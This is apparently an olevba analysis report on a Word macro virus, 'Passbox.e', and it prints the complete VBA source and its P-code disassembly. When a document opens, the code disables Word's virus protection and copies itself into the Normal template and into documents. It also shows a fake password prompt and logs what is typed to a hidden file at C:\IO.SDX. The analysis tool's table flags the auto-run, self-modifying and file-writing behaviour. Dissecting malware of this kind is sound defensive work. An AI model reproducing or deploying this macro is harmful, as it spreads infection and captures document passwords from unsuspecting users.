olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Passbox.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Passbox.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Eduardo.bas 
in file: ./Virus.MSWord.Passbox.e - OLE stream: 'Macros/VBA/Eduardo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo Final
       
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone

   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   
   Application.EnableCancelKey = wdCancelDisabled
      
   Set ActiveDoc = ActiveDocument
   Set GlobalDoc = NormalTemplate

   DocumentInstalled = False
   GlobalInstalled = False
       
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(i).Name = "Eduardo" Then
         DocumentInstalled = True
      End If
   Next

   For j = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(j).Name = "Eduardo" Then
         GlobalInstalled = True
      End If
   Next
   
      If DocumentInstalled = False Then
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Eduardo", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
      End If
           
     
      If GlobalInstalled = False Then
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Eduardo", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
      End If
    
      If ActiveDocument.HasPassword = False Then GoTo Final
      PassBox.Show
      

      
   Set ActiveDoc = ActiveDocument
   Set GlobalDoc = NormalTemplate
   
   DocumentInstalled = False
   GlobalInstalled = False
   
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(i).Name = "Star Ude" Then
         DocumentInstalled = True
      End If
   Next

   For j = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(j).Name = "Star Ude" Then
         GlobalInstalled = True
      End If
   Next
   
      If GlobalInstalled = True Then
         Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:="Star Ude", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
         Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
      End If
           
     
      If DocumentInstalled = True Then
         Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:="Star Ude", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
         Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
      End If
    
      If ActiveDocument.HasPassword = False Then GoTo Final
      PassBox.Show
marca

Final:
    End Sub
Sub Analise()
If PassBox.TextBox1 = "" Then
   ActiveDocument.Close
   Unload PassBox
   Else
   marca
   Grava
End If

End Sub
Sub Grava()
marca

On Error Resume Next
SetAttr "C:\IO.SDX", 0
Open "C:\IO.SDX" For Append As #1
Print #1, "Path = " + ActiveDocument.FullName
Print #1, "Password = " + PassBox.TextBox1
Print #1, " "
Close #1
SetAttr "C:\IO.SDX", 1 + 2 + 4

Unload PassBox
Application.DisplayAlerts = wdAlertsAll

End Sub

Sub marca()

Selection.TypeText Text:="Star Ude "
    Selection.MoveLeft Unit:=wdCharacter, Count:=6
    Selection.MoveRight Unit:=wdCharacter, Count:=5
    Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
    With Selection.Font
        .Name = "Arial Black"
        .Size = 48
        .Bold = True
        .Italic = False
        .Underline = wdUnderlineNone
        .StrikeThrough = False
        .DoubleStrikeThrough = False
        .Outline = False
        .Emboss = False
        .Shadow = True
        .Hidden = False
        .SmallCaps = False
        .AllCaps = False
        .ColorIndex = wdBlue
        .Engrave = False
        .Superscript = False
        .Subscript = False
        .Spacing = 0
        .Scaling = 100
        .Position = 0
        .Kerning = 0
        .Animation = wdAnimationShimmer
    End With
    Selection.MoveDown Unit:=wdLine, Count:=1
    With Selection.Font
        .Name = "Times New Roman"
        .Size = 12
        .Bold = True
        .Italic = False
        .Underline = wdUnderlineNone
        .StrikeThrough = False
        .DoubleStrikeThrough = False
        .Outline = False
        .Emboss = False
        .Shadow = True
        .Hidden = False
        .SmallCaps = False
        .AllCaps = False
        .ColorIndex = wdAuto
        .Engrave = False
        .Superscript = False
        .Subscript = False
        .Spacing = 0
        .Scaling = 100
        .Position = 0
        .Kerning = 0
        .Animation = wdAnimationNone
    End With
    Selection.TypeParagraph
    Selection.TypeParagraph
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Passbox.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/Eduardo - 7212 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError Final 
' Line #2:
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #4:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #5:
' Line #6:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' Line #9:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #10:
' Line #11:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #12:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #13:
' Line #14:
' 	LitVarSpecial (False)
' 	St DocumentInstalled 
' Line #15:
' 	LitVarSpecial (False)
' 	St GlobalInstalled 
' Line #16:
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Eduardo"
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitVarSpecial (True)
' 	St DocumentInstalled 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	StartForVariable 
' 	Next 
' Line #22:
' Line #23:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #24:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Eduardo"
' 	Eq 
' 	IfBlock 
' Line #25:
' 	LitVarSpecial (True)
' 	St GlobalInstalled 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	StartForVariable 
' 	Next 
' Line #28:
' Line #29:
' 	Ld DocumentInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #30:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Eduardo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' 	Ld ActiveDoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #32:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "PassBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #33:
' 	Ld ActiveDoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #34:
' 	EndIfBlock 
' Line #35:
' Line #36:
' Line #37:
' 	Ld GlobalInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #38:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Eduardo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #39:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #40:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "PassBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #41:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #42:
' 	EndIfBlock 
' Line #43:
' Line #44:
' 	Ld ActiveDocument 
' 	MemLd HasPassword 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Final 
' 	EndIf 
' Line #45:
' 	Ld PassBox 
' 	ArgsMemCall Show 0x0000 
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #50:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #51:
' Line #52:
' 	LitVarSpecial (False)
' 	St DocumentInstalled 
' Line #53:
' 	LitVarSpecial (False)
' 	St GlobalInstalled 
' Line #54:
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #56:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Star Ude"
' 	Eq 
' 	IfBlock 
' Line #57:
' 	LitVarSpecial (True)
' 	St DocumentInstalled 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	StartForVariable 
' 	Next 
' Line #60:
' Line #61:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #62:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Star Ude"
' 	Eq 
' 	IfBlock 
' Line #63:
' 	LitVarSpecial (True)
' 	St GlobalInstalled 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	StartForVariable 
' 	Next 
' Line #66:
' Line #67:
' 	Ld GlobalInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #68:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0008 "Star Ude"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #69:
' 	Ld ActiveDoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #70:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0007 "PassBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #71:
' 	Ld ActiveDoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #72:
' 	EndIfBlock 
' Line #73:
' Line #74:
' Line #75:
' 	Ld DocumentInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #76:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0008 "Star Ude"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #77:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #78:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0007 "PassBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #79:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #80:
' 	EndIfBlock 
' Line #81:
' Line #82:
' 	Ld ActiveDocument 
' 	MemLd HasPassword 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Final 
' 	EndIf 
' Line #83:
' 	Ld PassBox 
' 	ArgsMemCall Show 0x0000 
' Line #84:
' 	ArgsCall marca 0x0000 
' Line #85:
' Line #86:
' 	Label Final 
' Line #87:
' 	EndSub 
' Line #88:
' 	FuncDefn (Sub Analise())
' Line #89:
' 	Ld PassBox 
' 	MemLd TextBox1 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #90:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #91:
' 	Ld PassBox 
' 	ArgsCall Unlock 0x0001 
' Line #92:
' 	ElseBlock 
' Line #93:
' 	ArgsCall marca 0x0000 
' Line #94:
' 	ArgsCall Grava 0x0000 
' Line #95:
' 	EndIfBlock 
' Line #96:
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Sub Grava())
' Line #99:
' 	ArgsCall marca 0x0000 
' Line #100:
' Line #101:
' 	OnError (Resume Next) 
' Line #102:
' 	LitStr 0x0009 "C:\IO.SDX"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #103:
' 	LitStr 0x0009 "C:\IO.SDX"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Path = "
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Add 
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Password = "
' 	Ld PassBox 
' 	MemLd TextBox1 
' 	Add 
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 " "
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #108:
' 	LitStr 0x0009 "C:\IO.SDX"
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' Line #109:
' Line #110:
' 	Ld PassBox 
' 	ArgsCall Unlock 0x0001 
' Line #111:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #112:
' Line #113:
' 	EndSub 
' Line #114:
' Line #115:
' 	FuncDefn (Sub marca())
' Line #116:
' Line #117:
' 	LitStr 0x0009 "Star Ude "
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #118:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0006 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveLeft 0x0002 
' Line #119:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0005 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0002 
' Line #120:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0002 
' Line #121:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #122:
' 	LitStr 0x000B "Arial Black"
' 	MemStWith New 
' Line #123:
' 	LitDI2 0x0030 
' 	MemStWith Size 
' Line #124:
' 	LitVarSpecial (True)
' 	MemStWith Bold 
' Line #125:
' 	LitVarSpecial (False)
' 	MemStWith Italic 
' Line #126:
' 	Ld wdUnderlineNone 
' 	MemStWith Underline 
' Line #127:
' 	LitVarSpecial (False)
' 	MemStWith StrikeThrough 
' Line #128:
' 	LitVarSpecial (False)
' 	MemStWith DoubleStrikeThrough 
' Line #129:
' 	LitVarSpecial (False)
' 	MemStWith Outline 
' Line #130:
' 	LitVarSpecial (False)
' 	MemStWith Emboss 
' Line #131:
' 	LitVarSpecial (True)
' 	MemStWith Shadow 
' Line #132:
' 	LitVarSpecial (False)
' 	MemStWith Hidden 
' Line #133:
' 	LitVarSpecial (False)
' 	MemStWith SmallCaps 
' Line #134:
' 	LitVarSpecial (False)
' 	MemStWith AllCaps 
' Line #135:
' 	Ld wdBlue 
' 	MemStWith ColorIndex 
' Line #136:
' 	LitVarSpecial (False)
' 	MemStWith Engrave 
' Line #137:
' 	LitVarSpecial (False)
' 	MemStWith Superscript 
' Line #138:
' 	LitVarSpecial (False)
' 	MemStWith Subscript 
' Line #139:
' 	LitDI2 0x0000 
' 	MemStWith Spacing 
' Line #140:
' 	LitDI2 0x0064 
' 	MemStWith Scaling 
' Line #141:
' 	LitDI2 0x0000 
' 	MemStWith Position 
' Line #142:
' 	LitDI2 0x0000 
' 	MemStWith Kerning 
' Line #143:
' 	Ld wdAnimationShimmer 
' 	MemStWith Animation 
' Line #144:
' 	EndWith 
' Line #145:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveDown 0x0002 
' Line #146:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #147:
' 	LitStr 0x000F "Times New Roman"
' 	MemStWith New 
' Line #148:
' 	LitDI2 0x000C 
' 	MemStWith Size 
' Line #149:
' 	LitVarSpecial (True)
' 	MemStWith Bold 
' Line #150:
' 	LitVarSpecial (False)
' 	MemStWith Italic 
' Line #151:
' 	Ld wdUnderlineNone 
' 	MemStWith Underline 
' Line #152:
' 	LitVarSpecial (False)
' 	MemStWith StrikeThrough 
' Line #153:
' 	LitVarSpecial (False)
' 	MemStWith DoubleStrikeThrough 
' Line #154:
' 	LitVarSpecial (False)
' 	MemStWith Outline 
' Line #155:
' 	LitVarSpecial (False)
' 	MemStWith Emboss 
' Line #156:
' 	LitVarSpecial (True)
' 	MemStWith Shadow 
' Line #157:
' 	LitVarSpecial (False)
' 	MemStWith Hidden 
' Line #158:
' 	LitVarSpecial (False)
' 	MemStWith SmallCaps 
' Line #159:
' 	LitVarSpecial (False)
' 	MemStWith AllCaps 
' Line #160:
' 	Ld wdAuto 
' 	MemStWith ColorIndex 
' Line #161:
' 	LitVarSpecial (False)
' 	MemStWith Engrave 
' Line #162:
' 	LitVarSpecial (False)
' 	MemStWith Superscript 
' Line #163:
' 	LitVarSpecial (False)
' 	MemStWith Subscript 
' Line #164:
' 	LitDI2 0x0000 
' 	MemStWith Spacing 
' Line #165:
' 	LitDI2 0x0064 
' 	MemStWith Scaling 
' Line #166:
' 	LitDI2 0x0000 
' 	MemStWith Position 
' Line #167:
' 	LitDI2 0x0000 
' 	MemStWith Kerning 
' Line #168:
' 	Ld wdAnimationNone 
' 	MemStWith Animation 
' Line #169:
' 	EndWith 
' Line #170:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #171:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #172:
' 	EndSub 
' Line #173:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

